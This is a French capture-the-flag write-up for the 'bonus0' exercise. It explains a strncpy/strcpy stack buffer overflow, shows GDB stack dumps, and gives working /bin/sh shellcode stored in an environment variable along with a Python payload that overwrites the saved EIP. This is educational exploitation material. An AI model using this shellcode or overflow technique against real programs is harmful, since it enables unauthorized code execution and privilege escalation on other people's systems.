# Bonus0

### **Déroulement du programme :** ###

###### main()

- La fonction `pp()` est appelée, elle prend en paramètre un buffer (disons `dest`)

###### pp()

- Deux buffers sont alloués sur la stack, et sont passés en paramètre à deux appels successifs à la fonction `p()`

###### p()

- Le caractère `-` est affiché

- `read` de 4096 sur l'entrée standard

- `strchr` du caractère **'\n'**

- On déréférence le retour de `strchr()` pour lui assigner un **'\0'**. Ainsi, si `strchr()` ne trouve pas de '\n', il renverra `NULL`, l'affectation échouera et le programme plantera.

- Un `strncpy()` de 20 caractères est fait du buffer de lecture vers le buffer passée en paramètre.

###### pp()

- `read_1` est copié dans `dest`

- Un espace est mis à la place du `'\0'` de `dest`

- `read_2` est concaténé à `dest`

###### main()

- `dest` est imprimé sur la sortie standard

### **Objectif :** ###

Aller surcharger la sauvegarde de l'**EIP** présente dans la **stackframe** du **main** pour rediriger vers un **shell code** stocké dans une **variable d'environnement**. Pour ce faire, on va chercher à faire un **buffer overflow** depuis `dest`.


### **Tests :** ###

```
./bonus0
 -
# read_1
AAAA 
 -
# read_2
BBBB

# dest (read_1 + read_2)
AAAA BBBB
```

Ici rien d'étonnant, `read_2` a bien été concaténé à `read_1` dont on a remplacé le `'\0'` final par un espace.

```
./bonus0
 -
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB�� BBBBBBBBBBBBBBBBBBBB��
Segmentation fault (core dumped)
```

On peut maintenant observer que les buffers de `read_1` et `read_2` sont à la suite sur la stack et ont une taille de 20 octets

```
# juste après le second appel à p
Breakpoint 1 at 0x804854c
(gdb) r
Starting program: /home/user/bonus0/bonus0
 -
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Breakpoint 1, 0x0804854c in pp () // 
(gdb) x/30xw $esp
0xbffff660:	0xbffff69c	0x080486a0	0x00000000	0xb7fd0ff4
0xbffff670:	0xbffff6be	0xbffff6bf	0x00000001	0xb7ec3c49
0xbffff680:	0xbffff6bf	0xbffff6be	0x41414141	0x41414141
0xbffff690:	0x41414141	0x41414141	0x41414141	0x42424242
0xbffff6a0:	0x42424242	0x42424242	0x42424242	0x42424242
0xbffff6b0:	0xb7fd0ff4	0x00000000	0xbffff708	0x080485b9
```

`strncpy` ne cherche pas à mettre de `\0` si le nombre de caractère de la chaîne source est supérieure ou égale à la taille de la chaîne destinataire

`strcpy` n'a aucun moyen de savoir que `read_1` et `read_2` étaient à l'origine deux chaînes distinctes et s'arrêtera uniquement au premier octet `null` rencontré

`dest` étant un buffer de 54 octets (60 quand on regarde avec GDB) il nous est maintenant possible de faire notre **buffer overflow**

En effet, `dest` correspond maintenant à (`read_1` + `read_2` + quelques octets randoms + un espace) + (`read2` + quelques octets randoms), c'est amplement suffisant.

suite au segfault et grâce à [wiremask](https://wiremask.eu/tools/buffer-overflow-pattern-generator/?), on trouve un offset de 9.

### **Solution :** ### 

On crée notre shell-code.
```
export SHELL_CODE=$(python -c 'print "\x90"*30+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
```

À l'aide de **gdb** on trouve l'adresse de notre **variable d'environnement** à laquelle on ajoute la taille de son nom.

```
x/20s *((char **) environ)
```


Dans un fichier on va mettre :

`read_1` : 4096 caractères (dont un **'\n'**)

`read_2` : l'offset de 9, l'adresse de la variable d'environnement et 7 caractères

```
python -c 'print("A"*4095 + "\n" + "B"*9 + "\x12\xff\xff\xbf" + "D"*7)' > payload
```

```
cat payload - | ./bonus0
```

